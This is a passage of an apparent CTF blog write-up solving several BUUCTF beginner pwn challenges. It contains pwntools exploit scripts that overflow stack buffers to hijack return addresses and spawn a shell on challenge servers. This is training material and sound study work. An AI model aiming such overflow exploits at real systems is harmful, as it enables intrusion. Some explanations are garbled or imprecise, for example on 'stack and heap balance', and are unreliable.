@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="RIPchecksec, the binary software The char array capacity is only 15, and the puts function does not set the limit of the length we input so we can overflow the stack.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF-PWN1">
+<meta property="og:url" content="http://kelpie.top/post/[BUUCTF]%20PWN1.html">
+<meta property="og:site_name" content="Kelpie Blog">
+<meta property="og:description" content="RIPchecksec, the binary software The char array capacity is only 15, and the puts function does not set the limit of the length we input so we can overflow the stack.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fhe3CyKNRcbeYLOhDacs5uDEOKXK.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fr8wq1DwpBpM1Y-wY_NWgoGQP_fl.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FuYgxyXO2r-v4FFUGQ95jicDWAam.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FvaqhZ83yN3By6khO4MJ9OxraX6f.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtSljaXJ_IwjnAcZFGYXOmx5Al0z.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoSi818XlNfj56wZoAcu386gD_wf.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FnqRAl8ZnMaO2lSrYNTnIww-_v6O.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fj0M4JhSSAE6H9TjsOoWubNZBmBb.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjV-aBuNhqEW7Uyn0DtyzxhJkL-f.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpNAkCFSHxoiKEOKQcFK9DWS8o52.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpTaH3l6cCSCz36bZb8ZJaARmjdu.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FgCxPx7UZd94VnNvtgNTnvhuNYjE.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FppXms-MVBEyJxwOFJh6H809wfQ1.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtL5_U56k4-fuLxJcop2p3ElfN9Z.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpfLKiX7DpJjLV1xiCZ8E1EOzIqM.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FsQT3RaE3LHWN-ck0J1vQB01E7d4.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpHIyUMDLiQ_aJ8PuVo3jKwyJAis.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FgTywP95t4KCi7JCFImUbIvsMTtw.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FppFFmG-Xyr7Z2wQIjRtF0KDeR7D.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhadYMeYdx6xzJkmArk0a1pR-oLT.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Foi4fvhFnAGlY_Q-p-4s3SARYrKp.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FrX6VL9EVnFVVZqWzcrSSVa9SDXM.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FsZ1zHW8NERU-oKKiDUyw_Vs4hbm.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FifCdrcvrWM4W39o3s1i6F6VWvPG.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqWRSG6iYfpAUs1hZiQLulveghRz.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FiOffvpdzGU4ziw8pzUEfHcmVCVN.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fu1Eg65TaSUkWc2uZHMkSH26_O9r.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FiU5vaojKP1XrfUPhG525aOUDb0R.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoutBPQeNoYezNVeSMUrcEUCa6lG.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhJ6ZrMFgtZZsj0uJbWCSCJDkglJ.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Ft7P3OWfbeUoeyKEssAIb0SWh-Hs.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fs4UFhFfqFQ8ca0sEkmVNrdHtSeW.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhVoBBlVCoJM8ZMAgHsIy7TKgQex.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fo96IN04I8uvFybSC5GODtwdqmKb.png">
+<meta property="article:published_time" content="2022-09-11T23:39:33.000Z">
+<meta property="article:modified_time" content="2024-04-10T09:43:13.434Z">
+<meta property="article:author" content="l3vi4th4n">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="BUUCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fhe3CyKNRcbeYLOhDacs5uDEOKXK.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>BUUCTF-PWN1</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/post/%5BBUUCTF%5D%20PWN2.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/post/Virtual%20Attack%20%5B14%5D.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/[BUUCTF]%20PWN1.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/[BUUCTF]%20PWN1.html&text=BUUCTF-PWN1"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/[BUUCTF]%20PWN1.html&title=BUUCTF-PWN1"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/[BUUCTF]%20PWN1.html&is_video=false&description=BUUCTF-PWN1"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-PWN1&body=Check out this article: http://kelpie.top/post/[BUUCTF]%20PWN1.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/[BUUCTF]%20PWN1.html&title=BUUCTF-PWN1"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/[BUUCTF]%20PWN1.html&title=BUUCTF-PWN1"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/[BUUCTF]%20PWN1.html&title=BUUCTF-PWN1"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/[BUUCTF]%20PWN1.html&title=BUUCTF-PWN1"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/[BUUCTF]%20PWN1.html&name=BUUCTF-PWN1&description=&lt;h2 id=&#34;RIP&#34;&gt;&lt;a href=&#34;#RIP&#34; class=&#34;headerlink&#34; title=&#34;RIP&#34;&gt;&lt;/a&gt;RIP&lt;/h2&gt;&lt;p&gt;checksec, the binary software&lt;br&gt;&lt;img src=&#34;https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fhe3CyKNRcbeYLOhDacs5uDEOKXK.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The char array capacity is only 15, and the puts function does not set the limit of the length we input so we can overflow the stack.&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/[BUUCTF]%20PWN1.html&t=BUUCTF-PWN1"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#RIP"><span class="toc-number">1.</span> <span class="toc-text">RIP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#warmup-csaw-2016"><span class="toc-number">2.</span> <span class="toc-text">warmup_csaw_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-1"><span class="toc-number">3.</span> <span class="toc-text">ciscn_2019_n_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn1-sctf-2016"><span class="toc-number">4.</span> <span class="toc-text">pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level0"><span class="toc-number">5.</span> <span class="toc-text">jarvisoj_level0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2019-%E5%86%B3%E8%B5%9B-PWN5"><span class="toc-number">6.</span> <span class="toc-text">[第五空间 2019 决赛]PWN5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-c-1"><span class="toc-number">7.</span> <span class="toc-text">ciscn_2019_c_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-8"><span class="toc-number">8.</span> <span class="toc-text">ciscn_2019_n_8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-babystack"><span class="toc-number">9.</span> <span class="toc-text">bjdctf_2020_babystack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OGeek2019-babyrop"><span class="toc-number">10.</span> <span class="toc-text">[OGeek2019]babyrop</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        BUUCTF-PWN1
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">l3vi4th4n</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-09-11T23:39:33.000Z" class="dt-published" itemprop="datePublished">2022-09-11</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/BUUCTF/" rel="tag">BUUCTF</a>, <a class="p-category" href="/tags/PWN/" rel="tag">PWN</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="RIP"><a href="#RIP" class="headerlink" title="RIP"></a>RIP</h2><p>checksec, the binary software<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fhe3CyKNRcbeYLOhDacs5uDEOKXK.png"></p>
+<p>The char array capacity is only 15, and the puts function does not set the limit of the length we input so we can overflow the stack.</p>
+<span id="more"></span>
+
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fr8wq1DwpBpM1Y-wY_NWgoGQP_fl.png"></p>
+<p>We can find the evil function.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FuYgxyXO2r-v4FFUGQ95jicDWAam.png"></p>
+<p>The exploit code is followed.</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment"># io = process('./pwn')</span>
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25811</span><span class="token punctuation">)</span>
+offset <span class="token operator">=</span> <span class="token number">15</span><span class="token operator">+</span><span class="token number">8</span>
+padding <span class="token operator">=</span> <span class="token string">b'A'</span>
+
+payload <span class="token operator">=</span> offset<span class="token operator">*</span>padding <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000401187</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Maybe you will confuse about why we need to add 8 to the offset.<br>We need to keep heap and stack blanced inbalancedbit software.</p>
+<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex">payload = padding*offset + ret_addr + vuln_addr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41560595/article/details/112161243?ops_request_misc=&request_id=&biz_id=102&utm_term=pwn64%E4%BD%8D%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-5-112161243.142%5Ev47%5Epc_rank_34_default_3,201%5Ev3%5Econtrol_2&spm=1018.2226.3001.4187">Stack and Heap balanced</a></p>
+<h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p>We checksec the binary; there’s no measure to protect this software.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FvaqhZ83yN3By6khO4MJ9OxraX6f.png"><br>Oh damn, it gave the vulnerable function address to us -.-<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtSljaXJ_IwjnAcZFGYXOmx5Al0z.png"></p>
+<p>We check out the binary in IDA PRO, we can get the source code in c. That’s a simple code.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoSi818XlNfj56wZoAcu386gD_wf.png"></p>
+<p>we can overflow the stack and overwrite the reture areturn to jump to the 0x40060E to get the flag.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FnqRAl8ZnMaO2lSrYNTnIww-_v6O.png"></p>
+<p>I wrote two exploit codes for you; that’s reasonable, meaning why we need stack and heap balanced. The 64bit software can use the return address to keep the stack and heap balanced.</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn2'</span><span class="token punctuation">)</span>
+<span class="token comment"># io = remote('node4.buuoj.cn',29005)</span>
+padding <span class="token operator">=</span> <span class="token string">b'A'</span>
+offset <span class="token operator">=</span> <span class="token number">64</span><span class="token operator">+</span><span class="token number">8</span>
+ret_addr <span class="token operator">=</span> <span class="token number">0x40061c</span>
+payload <span class="token operator">=</span> padding<span class="token operator">*</span>offset <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40060D</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn2'</span><span class="token punctuation">)</span>
+<span class="token comment"># io = remote('node4.buuoj.cn',29005)</span>
+padding <span class="token operator">=</span> <span class="token string">b'A'</span>
+offset <span class="token operator">=</span> <span class="token number">64</span><span class="token operator">+</span><span class="token number">8</span>
+payload <span class="token operator">=</span> padding<span class="token operator">*</span>offset <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40060E</span><span class="token punctuation">)</span> <span class="token comment"># 0x40060d + 1</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>As we know, if we use the function in the code, we have to use the call instruction in disassemble code, meaning that we should use the ret instruction at the end of the process to keep the stack and heap balanced. The call instruction will push the following address in the stack and run the function. When the function part finishes its work, it will use ret instruction to pop the functATn address from the stack to return to the central region.</p>
+<h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>There are lot of knowledge we can learn from this challenge.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fj0M4JhSSAE6H9TjsOoWubNZBmBb.png"></p>
+<p>We can observe the source code in C on the IDA PRO.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjV-aBuNhqEW7Uyn0DtyzxhJkL-f.png"><br>Here is the funny part, we pass the value to v1, and the process determines that v2 equals the float.<br>We can overwrite the v2 by stack overflow. We can add the vulnerable address after the numerous characters we input.</p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpNAkCFSHxoiKEOKQcFK9DWS8o52.png"><br>We can get the float hex style in the IDA comment</p>
+<p>exp1</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment"># io = process('./pwn3')</span>
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">28656</span><span class="token punctuation">)</span>
+number_hex <span class="token operator">=</span> <span class="token number">0x41348000</span>
+padding <span class="token operator">=</span> <span class="token string">b'a'</span>
+offset <span class="token operator">=</span> <span class="token number">0x30</span><span class="token operator">-</span><span class="token number">0x4</span>
+
+payload <span class="token operator">=</span> padding <span class="token operator">*</span> offset <span class="token operator">+</span> p64<span class="token punctuation">(</span>number_hex<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>We can overwrite the v2, so why not overwrite the whole stack?<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpTaH3l6cCSCz36bZb8ZJaARmjdu.png"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn3"</span><span class="token punctuation">)</span>
+sys_addr <span class="token operator">=</span> <span class="token number">0x4006BE</span>
+
+offset <span class="token operator">=</span> <span class="token number">0x30</span><span class="token operator">+</span><span class="token number">0x8</span> <span class="token comment"># 64位不要忘记堆栈平衡哦</span>
+payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><p>Pwn challenges need patience and focus</p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FgCxPx7UZd94VnNvtgNTnvhuNYjE.png"></p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FppXms-MVBEyJxwOFJh6H809wfQ1.png"><br>We can get the stack limit is 0x3c. If we input the character over 0x3c, we can overflow the stack. But it can’t pass more than 32 characters in the “fgets” function, which sets the limit we input. That is why we need to use the replace function after the fgets. It can replace ‘I’ with ‘you’. If we input 20 characters ‘I’, we can get 60 characters ‘you’ in the stack, which means we can overflow the stack.</p>
+<p>check the ‘cat flag.txt’ address.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtL5_U56k4-fuLxJcop2p3ElfN9Z.png"></p>
+<p>when we overflow the stack, do not forget to cover the return address!</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment"># io = process('./pwn4')</span>
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27632</span><span class="token punctuation">)</span>
+
+padding <span class="token operator">=</span> <span class="token string">'I'</span>
+offset <span class="token operator">=</span> <span class="token number">20</span>
+addr <span class="token operator">=</span> <span class="token number">0x08048f13</span>
+
+payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>padding<span class="token operator">*</span>offset<span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">,</span> addr<span class="token punctuation">]</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h2><p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpfLKiX7DpJjLV1xiCZ8E1EOzIqM.png"></p>
+<p>to simple to get the exp!</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment"># io = process('./pwn5')</span>
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27483</span><span class="token punctuation">)</span>
+str_bin_sh <span class="token operator">=</span> <span class="token number">0x400597</span>
+padding <span class="token operator">=</span> <span class="token string">b'A'</span>
+offset <span class="token operator">=</span> <span class="token number">128</span><span class="token operator">+</span><span class="token number">8</span>
+
+payload <span class="token operator">=</span> padding<span class="token operator">*</span>offset <span class="token operator">+</span> p64<span class="token punctuation">(</span>str_bin_sh<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="第五空间-2019-决赛-PWN5"><a href="#第五空间-2019-决赛-PWN5" class="headerlink" title="[第五空间 2019 决赛]PWN5"></a>[第五空间 2019 决赛]PWN5</h2><p>We can solve this challenge by the String Format vulnerability<br>The Format String exploit occurs when the submitted data of an input string is evaluated as a command by the application. In this way, the attacker could execute code, read the stack, or cause a segmentation fault in the running application, causing new behaviors that could compromise the security or the stability of the system.</p>
+<p><a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/Format_string_attack">Detail of FORMAT STRING</a></p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FsQT3RaE3LHWN-ck0J1vQB01E7d4.png"></p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpHIyUMDLiQ_aJ8PuVo3jKwyJAis.png"></p>
